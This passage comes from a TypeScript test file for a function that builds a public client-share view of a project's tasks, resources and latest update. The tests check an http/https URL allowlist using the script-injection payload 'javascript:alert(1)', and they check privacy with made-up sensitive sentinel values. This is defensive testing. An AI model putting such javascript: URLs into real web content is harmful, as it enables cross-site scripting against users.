        { title: "Design hero", publicGroup: "completed", waitingForClientFeedback: false },
        { title: "Build header", publicGroup: "in_progress", waitingForClientFeedback: true },
      ]);
      expect(result.data.progress).toEqual({ completed: 1, total: 2, percent: 50 });
      expect(result.data.resources).toEqual([
        { kind: "link", label: "Brand guide", url: "https://example.com/brand-guide" },
      ]);
    }
  });

  it("omits a mapped link resource with an unsafe scheme -- the http/https allowlist applies identically on this path", async () => {
    setAdminConfig({
      linkFieldsRows: [validPublicLinkFieldsRow()],
      projectRows: [{ title: "T", status: "New", deadline_date: null }],
      taskMappingRows: [],
      resourceMappingRows: [
        { resource_id: VALID_RESOURCE_ID, public_label: "Sentinel", can_download: false },
      ],
      resourceRows: [
        {
          id: VALID_RESOURCE_ID,
          url: "javascript:alert(1)",
          storage_path: null,
          file_name: null,
          resource_type: "link",
        },
      ],
    });

    const result = await buildPublicClientShareProjection({
      shareLinkId: VALID_LINK_ID,
      projectId: VALID_PROJECT_ID,
      userId: VALID_USER_ID,
    });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.resources).toEqual([]);
      expect(JSON.stringify(result.data)).not.toContain("javascript:alert(1)");
    }
  });

  it("a mapped task that no longer resolves in the tasks table simply disappears -- fail-closed", async () => {
    setAdminConfig({
      linkFieldsRows: [validPublicLinkFieldsRow()],
      projectRows: [{ title: "T", status: "New", deadline_date: null }],
      taskMappingRows: [{ subtask_id: "1", public_group: "completed", waiting_for_client_feedback: false }],
      resourceMappingRows: [],
      taskRows: [],
    });

    const result = await buildPublicClientShareProjection({
      shareLinkId: VALID_LINK_ID,
      projectId: VALID_PROJECT_ID,
      userId: VALID_USER_ID,
    });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.tasks).toEqual([]);
      expect(result.data.progress).toBeNull();
    }
  });
});

describe("buildPublicClientShareProjection - latest update from share_link_updates only", () => {
  it("includes only the current published update's body/publishedAt", async () => {
    setAdminConfig({
      linkFieldsRows: [validPublicLinkFieldsRow()],
      projectRows: [{ title: "T", status: "New", deadline_date: null }],
      taskMappingRows: [],
      resourceMappingRows: [],
      updateRows: [{ body: "Kickoff went great.", published_at: VALID_TIMESTAMP }],
    });

    const result = await buildPublicClientShareProjection({
      shareLinkId: VALID_LINK_ID,
      projectId: VALID_PROJECT_ID,
      userId: VALID_USER_ID,
    });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.latestUpdate).toEqual({ body: "Kickoff went great.", publishedAt: VALID_TIMESTAMP });
    }
  });

  it("is null when there is no current update row", async () => {
    setAdminConfig({
      linkFieldsRows: [validPublicLinkFieldsRow()],
      projectRows: [{ title: "T", status: "New", deadline_date: null }],
      taskMappingRows: [],
      resourceMappingRows: [],
      updateRows: [],
    });

    const result = await buildPublicClientShareProjection({
      shareLinkId: VALID_LINK_ID,
      projectId: VALID_PROJECT_ID,
      userId: VALID_USER_ID,
    });

    expect(result.ok).toBe(true);
    if (result.ok) expect(result.data.latestUpdate).toBeNull();
  });
});

describe("buildPublicClientShareProjection - MANDATORY toxic fixture privacy test (public/service-role path)", () => {
  it("never leaks any private/internal sentinel value anywhere in the serialized public projection", async () => {
    const UNSHARED_TASK_TITLE_SENTINEL = "TOXIC_PUBLIC_UNSHARED_TASK_pay_dispute_details";
    const UNSHARED_RESOURCE_FILE_SENTINEL = "TOXIC_PUBLIC_UNSHARED_FILE_ssn_scan.pdf";
    const UNSHARED_RESOURCE_PATH_SENTINEL = "private/toxic/public/ssn_scan_storage_path.pdf";

    setAdminConfig({
      linkFieldsRows: [validPublicLinkFieldsRow({ client_facing_subtitle: "A quick refresh" })],
      // Only task id 1 and resource VALID_RESOURCE_ID are mapped/shared.
      taskMappingRows: [{ subtask_id: "1", public_group: "completed", waiting_for_client_feedback: false }],
      resourceMappingRows: [
        { resource_id: VALID_RESOURCE_ID, public_label: "Shared logo", can_download: false },
      ],
      projectRows: [{ title: "Website launch", status: "In Progress", deadline_date: "2026-09-01" }],
      // Task id 99 (sensitive, UNSHARED) must never reach the resolved set.
      taskRows: [
        { id: 1, task_title: "Design hero section" },
        { id: 99, task_title: UNSHARED_TASK_TITLE_SENTINEL },
      ],
      // Resource VALID_RESOURCE_ID_2 (sensitive, UNSHARED) must never
      // reach the resolved set.
      resourceRows: [
        {
          id: VALID_RESOURCE_ID,
          url: null,
          storage_path: "private/shared/public-logo.png",
          file_name: "logo.png",
          resource_type: "file",
        },
        {
          id: VALID_RESOURCE_ID_2,
          url: null,
          storage_path: UNSHARED_RESOURCE_PATH_SENTINEL,
          file_name: UNSHARED_RESOURCE_FILE_SENTINEL,
          resource_type: "file",
        },
      ],
    });

    const result = await buildPublicClientShareProjection({
      shareLinkId: VALID_LINK_ID,
      projectId: VALID_PROJECT_ID,
      userId: VALID_USER_ID,
    });

    expect(result.ok).toBe(true);
    if (!result.ok) return;

    const serialized = JSON.stringify(result.data);

    for (const sentinel of [
      UNSHARED_TASK_TITLE_SENTINEL,
      UNSHARED_RESOURCE_FILE_SENTINEL,
      UNSHARED_RESOURCE_PATH_SENTINEL,
      "Urgent",
      VALID_PROJECT_ID,
      VALID_USER_ID,
      VALID_LINK_ID,
      "private/shared/public-logo.png",
    ]) {
      expect(serialized).not.toContain(sentinel);
    }

    expect(result.data.tasks).toEqual([
      { title: "Design hero section", publicGroup: "completed", waitingForClientFeedback: false },
    ]);
    expect(result.data.resources).toEqual([{ kind: "file", label: "Shared logo", canDownload: false }]);
  });
});
